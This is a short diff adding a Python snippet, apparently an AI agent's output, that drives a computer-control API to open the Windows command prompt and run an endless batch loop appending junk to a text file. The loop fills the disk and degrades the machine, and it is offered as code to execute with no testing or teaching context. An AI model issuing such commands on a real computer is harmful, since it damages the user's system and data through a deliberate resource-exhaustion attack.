@@ -1,0 +1,5 @@
+```python
+computer.os.open_program("cmd")
+computer.keyboard.write(":loop & echo junk >> junk.txt & goto loop")
+computer.keyboard.press("enter")
+```<|eot_id|>
